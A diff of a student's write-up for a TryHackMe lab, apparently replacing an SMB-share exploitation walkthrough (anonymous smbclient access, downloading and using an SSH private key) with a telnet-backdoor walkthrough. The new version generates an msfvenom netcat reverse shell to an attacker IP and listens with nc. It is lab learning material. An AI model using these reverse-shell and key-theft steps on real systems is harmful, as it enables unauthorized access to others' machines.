@@ -1,4 +1,4 @@
-![image](https://github.com/abelmorad/Cyber-Defense-Network-Services-Documentation-Challenge-2/assets/110463619/102683de-0cb6-454e-87cd-c3479e87a596)# Documentation: TryHackMe Cyber Defense #02
+![image](https://github.com/abelmorad/Cyber-Defense-Network-Services-Documentation-Challenge-2/assets/110463619/f979b8e5-5f41-42d5-8bf0-a02f863ecc8c)![image](https://github.com/abelmorad/Cyber-Defense-Network-Services-Documentation-Challenge-2/assets/110463619/102683de-0cb6-454e-87cd-c3479e87a596)# Documentation: TryHackMe Cyber Defense #02
 
 ## 1. Introduction
 - **Purpose**: Document my experience and share knowledge on the Cyber Defense challenges
@@ -21,55 +21,39 @@
          - Shows that top 1000 ports are not open
        ![image](https://github.com/abelmorad/Cyber-Defense-Network-Services-Documentation-Challenge-2/assets/110463619/26a37547-6cf4-4d6c-9011-fb3af482edcd)
       - `nmap -A -p 8000-9000 10.10.177.199` -vv
-         - Scanned ports between 8000-9000 discovered an open port 8012/tcp
+         - Scanned ports between 8000-9000 and discovered an open port 8012/tcp
        ![image](https://github.com/abelmorad/Cyber-Defense-Network-Services-Documentation-Challenge-2/assets/110463619/4ce2baa3-4768-4b60-8d4b-9ac6d15922f9)
-      - `telnet 10.10.177.199 8012`
-         - Now you can connect to the telnet server using the discovered port 8012
-       ![image](https://github.com/abelmorad/Cyber-Defense-Network-Services-Documentation-Challenge-2/assets/110463619/e6bcd72f-8053-46dc-837c-6ca396e0d149)
-
 
   - **Findings**:
-	- Users are: administrator, guest, krbtgt, domain admins, root, bin, none
-	- No password 
-	- Workgroup name is WORKGROUP
-	- Name of machine is polosmb
-	- OS running on version 6.1
-	- ***Ports that are open***:
-		- 22/tcp  open  ssh
-		- 139/tcp open  netbios-ssn
-		- 445/tcp open  microsoft-ds
-	- Users profiles is shared in the SMB with the sharename 'profiles'
+	The open port is 8012
+    	A possible username might be Skidy
+        - Service might be a backdoor 
 
 ### 3.3 Exploitation
-- **Vulnerability Identification**: [CVE-2017-7494](https://nvd.nist.gov/vuln/detail/CVE-2017-7494)
-  - **Techniques Used**:  exploiting anonymous SMB share access- a common misconfiguration that can allow us to gain information that will lead to a shell.
+- **Vulnerability Identification**: Telnet vulnerability
+  - **Techniques Used**:  Exploit using netcat reverse shell payload in the telnet server
 
 - **Exploitation Process**:
-	- Enter to access SMB `smbclient //10.10.242.131/ Anonymous -U profiles`
-	- Press enter on the password because there is no password set
-	- Enter `ls -a` to show files and hidden files
-![Screenshot 2024-05-20 183213](https://github.com/abelmorad/Cyber-Defense-Network-Services-Documentation-Challenge/assets/110463619/ef9f7522-8502-429f-bc32-cad423820baa)
+  
+	- Enter `telnet 10.10.177.199 8012`  now you can connect to the telnet server using the discovered port 8012
+   	
+        ![image](https://github.com/abelmorad/Cyber-Defense-Network-Services-Documentation-Challenge-2/assets/110463619/e6bcd72f-8053-46dc-837c-6ca396e0d149)
 
-	- Type `get Working From Home Information` to download to your download folder
-![Screenshot 2024-05-20 182845](https://github.com/abelmorad/Cyber-Defense-Network-Services-Documentation-Challenge/assets/110463619/1d7c5b9c-018a-4ab7-959a-64dbbc710cea)
+	- Enter `msfvenom -p cmd/unix/reverse_netcat lhost=10.17.64.194 lport=4444 R` to generate a reverse shell payload using msfvenom
+	  
+   	![image](https://github.com/abelmorad/Cyber-Defense-Network-Services-Documentation-Challenge-2/assets/110463619/56f3c19c-bd00-4d59-98f6-7f47da11b424)
 
-	- Enter `cat Working From Home Information.txt` in the terminal to view the text file
-![Screenshot 2024-05-20 184207](https://github.com/abelmorad/Cyber-Defense-Network-Services-Documentation-Challenge/assets/110463619/417d6c7f-e9c6-491a-80bc-dbd43424dc9b)
+  	- Enter `nc -lvp 4444` to start netcat lister to listen for inbound connection and see data
+	![image](https://github.com/abelmorad/Cyber-Defense-Network-Services-Documentation-Challenge-2/assets/110463619/cef1919e-40fc-4e27-b83b-7e1cbd3e0f18)
 
-	- Type `open .ssh` to access directory
-![Screenshot 2024-05-20 183844](https://github.com/abelmorad/Cyber-Defense-Network-Services-Documentation-Challenge/assets/110463619/a871111d-92af-4503-8973-c949870cfb41)
+	- Copy the payload into the telnet server CLI and press enter
+   	![image](https://github.com/abelmorad/Cyber-Defense-Network-Services-Documentation-Challenge-2/assets/110463619/09af501b-3792-4d1d-9fa7-0dc51f9f299d)
 
-	- To download type `get id_rsa`
-![Screenshot 2024-05-20 183844](https://github.com/abelmorad/Cyber-Defense-Network-Services-Documentation-Challenge/assets/110463619/ba82f020-cde0-452d-948c-5f08794d993d)
+   	- Go to the netcat lister and enter `ls` it will show the file flag.txt
+  	![image](https://github.com/abelmorad/Cyber-Defense-Network-Services-Documentation-Challenge-2/assets/110463619/bad9f0bf-77d9-4770-90d3-5240f7384d8a)
 
-	- Type `chmod 600` id_rsa to change the permissions
-![chmod](https://github.com/abelmorad/Cyber-Defense-Network-Services-Documentation-Challenge/assets/110463619/c0217817-5203-46c4-9743-66995a57566a)
-
-	- Type `ssh cactus@10.10.242.131 -i id_rsa` to access the server
-![Screenshot 2024-05-20 190916](https://github.com/abelmorad/Cyber-Defense-Network-Services-Documentation-Challenge/assets/110463619/b61b84c7-f850-4c50-b0bd-147bcbfecbfd)
-
-	- Type `ls`  to show files then `cat smb.txt` to view text file
-![Screenshot 2024-05-20 191157](https://github.com/abelmorad/Cyber-Defense-Network-Services-Documentation-Challenge/assets/110463619/145c3e10-0603-4e3e-a297-f55fee5498ee)
+	- Enter `cat flag.txt` to capture the flag
+   	![image](https://github.com/abelmorad/Cyber-Defense-Network-Services-Documentation-Challenge-2/assets/110463619/d4896955-1e10-4cb3-9576-65c33d4684c5)
 
 
 ## 4. Analysis and Reflection
